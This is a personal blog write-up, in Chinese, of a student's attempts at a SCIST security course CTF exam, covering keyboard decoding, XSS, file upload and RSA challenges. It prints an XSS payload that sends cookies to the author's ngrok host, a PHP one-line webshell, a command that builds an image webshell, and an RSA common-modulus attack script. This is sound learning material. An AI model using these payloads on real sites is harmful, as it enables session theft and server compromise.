---
title: SCIST S4 資訊安全期末考 Writeup
categories:
    - CTF
tags:
    - 資安
    - SCIST
abbrlink: be8e46ca
date: 2024-05-28 13:33:42
cover: https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/SCIST.jpg
---

我在 2024 參加了 SCIST 課程，雖然常常聽不懂但感覺還是收穫不少。這是上學期最後的一個考試，透過考試來審查是否可以進入下學期的課程。(很幸運的我有過！雖然我覺得我還得多練)。所以以下是一些我有進展的題目的 Write Up。如果發現有錯誤或是哪裡不足，可以在底下留言區留言，我會十分感激！

# Welcome

這題我們可以從開發者工具發現類似以下的元素。

```html=
<div class="key--double" data-key="49" data-input="?F"><div>!</div><div>1</div></div>
```

再透過以下的 index.js 代碼可以找到真正的 input。

```javascript=
if (key.hasAttribute("data-input")) {
        if (e.shiftKey) {
            msg += key.getAttribute("data-input")[0];
        } else {
            msg += key.getAttribute("data-input")[1];
        }
        typingElement.innerHTML = msg.replace(/ /g, "&nbsp;");
    }
```

每個標籤的 data-input 屬性是由兩個字符所組成，以上面的 html 標籤為例，當我們按著 shift 的時候按下數字 1 按鍵，實際的 input 會是`?`，也就是 index 為 0 的位置；但當我們只是單純按下數字 1 按鍵的時候，input 會是`F`，就是 index 為 1 的位置。

知道了這個特性後，翻找到一份 index.css 文件，將其打開會發現第一行有個註解，以下:

```css=
/* Passpharse : "JP Jf3j-F@%#$4H%xw" */
```

我們用一般打字的方法，用 shift 切換大小寫，嘗試輸入 Passphrase。經過以上的轉換，便可以得到 flag。

```txt
flag = SCIST{G0oD_1u(k_!}
```

# XSSER

看了題目給的 app.js 檔案，可以發現 Flag 是在 visit 函數裡面被設定的，如下。

```javascript=
async function visit(noteId) {
    const url = `http://127.0.0.1:3000/note/${noteId}`;
    console.log(`[+] Visiting ${url}`);
    const context = await browser.createIncognitoBrowserContext()
    const page = await context.newPage()

    await page.setCookie({
        name: 'flag', value: FLAG,
        domain: '127.0.0.1', path: '/',
        httpOnly: false, secure: false, sameSite: 'Lax'
    });

    try {
        await page.goto(url, { waitUntil: 'networkidle0' })
        await sleep(1000);
    } catch (e) {
        console.error(`[+] error visting ${path} `, e)
    }
    await page.close()
    await context.close()
}
```

而要觸發這個 visit 函數，必須在回報 note 的地方輸入一個正確合法的 ID，才會執行 visit 函數，程式碼如下。

```javascript=
app.post('/report', (req, res) => {
    const { id } = req.body;
    if (!NOTES.has(id)) return res.send("Note not found");
    visit(id);
    res.send('Admin will check your report');
});
```

接著先在網站嘗試隨意 POST 一個正常的 note，會發現網址變成了以下的形式。

```txt
http://lab.scist.org:20001/note/732733d42c28d7060c71be53a4dd491b
```

其中"note/"路徑後面的`1e9dafbc67ea0516bacce8d5d36a3c7a`，便是一個合法的 note ID。

到了這邊，我原本以為是要把合法的 ID 和 XSS 的 payload 結合在一起，並在 Report 的地方提交。但經過助教的提示之後，知道應該是要把 payload 提交在 note 的內文，所以我開始重新研究一次 app.js 的程式碼。發現了之前沒仔細看到可能可以注入 XSS 的地方，如下。

```javascript=
app.get('/note/:noteId', (req, res) => {
    const noteId = req.params.noteId;
    const note = NOTES.get(noteId);
    if (!note) return res.send('Note not found!');
    res.send(`<h1>Your Note<h1><p id="note">${note}</p>`);
});
```

在這段程式碼中，可以看到我們提交的 note 會被夾在 p 標籤中解析，所以我嘗試注入`<script>alert(1)</script>`發現不能執行，因為 app.js 裡面限制了允許的標籤白名單，只有 s、b、u、p、code 這五個標籤能使用，其餘的標籤會被 strip 掉。知道可以用的標籤後，我使用了 p 標籤提交，嘗試執行 javascript，payload 如下:

```javascript=
<p/onmouseover=alert(1)>test<p>
```

發現 note 只會被解析成`test`，而移動滑鼠到上面的時候也確實會執行 js，因此接下來要做的就是修改 payload，並再提交 note 後去 report 的地方提交 id，讓 visit 去執行到我們提交的腳本，就可以得到 cookie 了。

我用 ngrok 在本地先架了個伺服器，並且嘗試透過其獲取 cookie，payload 如下:

```html=
<p/onmouseover=document.location.href="https://1ffb-36-234-174-194.ngrok-free.app/"+document.cookie style="position:fixed;left:0;top:0;width:9999px;height:9999px;">test<p>
```

但是因為 onmouseover 屬性需要有滑鼠滑過，即便我把 p 標籤調整的很大，但因為 visit 函數不會有滑鼠滑過，所以還是不會執行。很可惜到了截止的最後，還是沒能找出正確的 payload 獲取到 flag。

最後來談談這個漏洞在真實世界可能的危害，題目在每次回報完後都會提示`admin will check your report`，這告訴我們如果真實世界中有人利用 XSS 漏洞注入了惡意代碼，而當系統管理員去"check"的時候，自己的 cookie 可能就會被利用，讓有心人士可以在不知道 admin 帳號密碼的情況下以 admin 的權限登入系統。

# Uploader

在這題裡面，我先嘗試上傳了一張正常的圖片，發現網頁會呈現這樣的狀態。![](https://hackmd.io/_uploads/ByG6mhhcT.png)
我一開始先用了課程中教過的一句話木馬來嘗試上傳，我上傳的是 php 檔。

```php=
<?php echo system($_GET['command']); ?>
```

結果系統會回應`not a PNG file`，這表示前端會檢測是否為合法的上傳檔案類型，我又嘗試把檔名修改為`shell.php.png`再進行上傳，結果系統的回應是`Invalid image`，表示後端也有檢測他是否為 PNG 檔案。後來又嘗試了很多其他的方法，包括在 php payload 前面加上 magic numbers `89504E47`嘗試讓系統解析為 PNG 檔，但得到的回應都跟前面差不多。

最後，在經過一番搜尋、查找資料後，發現只剩下一個方法，就是上傳圖片馬。所謂的圖片馬，就是把圖片和木馬組合在一起上傳。於是我準備了一張正常的 png(normal.png)和惡意的 php 代碼(shell.php)，將其放在同一個路徑底下。接著利用以下的指令將其組合為惡意圖片馬(pwn.png):

```txt
copy normal.png/b + shell.php/a pwn.png
```

接著我將 pwn.png 上傳，發現系統回應`Bad content`，到這邊，比賽就結束了，結果最後還是沒能成功地取得 Flag，QQ。

# Common modulus

這題的題目給了三個 e(公鑰)，三個 c(密文)，還有一個 n(質數因子相乘)，如果有其中兩個 e 是互質，也就是 gcd(e1, e2) = 1 的話，就可以利用一般的共模攻擊，去求得 m(明文)，就是利用會有一組 s1 和 s2 滿足 s1 _ e1 + s2 _ e2 = 1 的條件，加上一點計算，去找出原本的 m，如下。

```txt
已知 s1 * e1 + s2 * e2 = 1
==========================
c1 ^ s1 * c2 ^ s2 mod n
= m ^ (e1 * s1) * m ^ (e2 * s2) mod n
= m ^ (e1 * s1 + e2 * s2) mod n
= m mod n
= m
```

可惜這題的三個 e 都不是互質的，所以要用其他的方法，我就找到了[一篇文章][7]，裡面的方法是這樣:

```txt
gcd(e1, e2) = gcd
c1 = (m ^ e1') ^ gcd mod n
c2 = (m ^ e2') ^ gcd mod n
e1' * s1 + e2' * s2 = 1

c1 ^ s1 * c2 ^s2 mod n
= (((m ^ e1') ^ gcd) ^ s1) * (((m ^ e2') ^ gcd) ^s2) mod n
= m ^ (e1' * s1 * gcd + e2' * s2 * gcd) mod n
= m ^ gcd mod n
```

所以只要把最後算出來的 m 再開 gcd 次方根就能找到明文，於是我寫了下面的腳本。

```python=
from gmpy2 import gcdext, iroot, gcd
from Crypto.Util.number import inverse, long_to_bytes

n = 22777210958276255973049562078823322470680917129996977683503001216538435863571279721754251786904659128777249694642787480739356668460290853226080964490087136228546045908347764486557698226166963415933243390587759408509357466384117429023536043020407223339909068182712164327318468662771341384255178839693851749833498595767285757850112681038669603653206881003854674152787778849201349140811383067441876396986225542868926178627083357794996583066978454919162611524965685485188287561894204743004599366796640463833284730895990140454443706509700257117888543581605105114423861683342316455500361042572686499019143155407840720672419
e1 = 2755481107
e2 = 3066037283
# e3 = 3825027809
c1 = 7927632180925780686814468716254548866073876571301670927803568567992929927231666309788681512003760545920706822481579873353923145930555620003462589361971404649174770107086295817994744475096856399932862153021335565923236506465046739212222528807145844779588311833022632475905272022533594289777471811000950934146066045472218603345107418836739010466236517799411565681939684720963118217633594133046157469386003057018852372681387318985149400851657988757739939640107583630568340335757129814894759082226790230350623403635880468479392207604875482436028050237168056669104984504520909514306552404757744266671282270481535254632231
c2 = 19162894772364755634695403163786451410245098251726628084799257554767334519905640179161346412307514221332891648206034353728374020165930677162860102377777681292582203157662333178388904577242217496599789741706061676944395451665239726479077741007297709368920091594846785681021427819585722029936761040901809601396670202192052497066209075288103228744858127970671076282164969113619499174358765991380757911727424305398346399701274033326030443722686643479760852934150701783998463047750118216160431187984416861424972003041835112849345069144579908117061092179552843173803432427193984945136248106420527309951492325647621839772126
# c3 = 12281989205300534636704612304895466894728582803084654071108548003638296732533233324118128443432186580642178421360358569501856887776677567285142630332770995470034693283004693504328569378601328550606731466373274474890323776647142155504550689141803732334439130044963732806927780975317712578470165550637007845813598338398021681428237912733055103663278507239375781432804708170722603762602715296180599171769475818480578806749013564273888734572033232825425951511959908980277564593244704622649568752985829748683356507419796438898916535864730103144986484287500764463579887673117770889298009984153867524175061353407719439002075

g = gcd(e1, e2)
e1_ = e1 // g
e2_ = e2 // g
l, s1, s2 = gcdext(e1_, e2_)
m = pow(c1, s1, n) * pow(c2, s2, n) % n
m = iroot(m, g)[0]
print(f"flag = {long_to_bytes(m).decode()}")
```

只不過最後的答案是錯誤的，沒能找到正確的 flag。可能是因為本題的 gcd 太大，還要找其他的算法。

# 參賽心得

這次算是我第一次花了那麼多的時間打 CTF 比賽，之前可能就是自己在網路上解解題甚麼的，總的來說還是很有趣的一次體驗。而參加完這次的比賽，我也更加地意識到自己的不足，真的還有很多可以進步、練習的地方。即便可能有點被打擊信心，但我也不會氣餒，我要更努力的練習，沒事就多解解題甚麼的，增強自己的實力，希望可以在之後的比賽表現得越來越好！

# 參考資料區

-   [文件上傳漏洞總結][1]
-   [PERSISTENT PHP PAYLOADS IN PNGS: HOW TO INJECT PHP CODE IN AN IMAGE – AND KEEP IT THERE !][2]
-   [[Day 26] 026 - 串流加密法 - Stream cipher][3]
-   [童舒晧資安資源整理(XSS 教學)][4]
-   [安全工具——XSSer][5]
-   [XSSer 使用(CSDN)][6]
-   [关于 RSA 共模攻击 e1，e2 不互素的解法][7]
-   [文件上传漏洞进阶教程/白名单绕过/图片马制作/图片马执行][8]

[1]: https://yinwc.github.io/2020/04/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#/%E5%85%B6%E4%BB%96%E8%A7%84%E5%88%99
[2]: https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html
[3]: https://ithelp.ithome.com.tw/articles/10245459?sc=hot
[4]: https://hackmd.io/@foxo-tw/slides/%2F%40foxo-tw%2FByAkemFv7%3Ftype%3Dslide%23%2F1
[5]: https://xz.aliyun.com/t/3952?time__1311=n4%2BxnD0DBDgGG%3DG8%2BeDsA3xCqm%2Fz3K3r34D&alichlgref=https%3A%2F%2Fwww.google.com%2F
[6]: https://blog.csdn.net/mydriverc2/article/details/42048983?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1-42048983-blog-113249158.235^v43^pc_blog_bottom_relevance_base9&spm=1001.2101.3001.4242.2&utm_relevant_index=2
[7]: https://blog.csdn.net/CHUNJIUJUN/article/details/120553701
[8]: https://blog.csdn.net/qq_40345591/article/details/127476867
